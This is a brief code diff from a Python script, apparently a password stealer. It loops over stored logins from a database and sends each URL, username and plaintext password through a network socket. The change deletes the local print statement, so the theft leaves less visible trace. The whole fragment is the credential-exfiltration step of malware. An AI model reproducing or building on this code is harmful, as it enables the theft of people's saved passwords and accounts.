@@ -28,7 +28,6 @@ for index, login in enumerate(cur.fetchall()):
     password = login[2]
 
     msgT = ("\nUrl: " + url + "\nUser: " + username + "\nPassword: " + str(password) + "\n")
-    print(msgT)
     s.send(msgT.encode('utf-8'))
 
 # finalizando a conexão com o arquivo
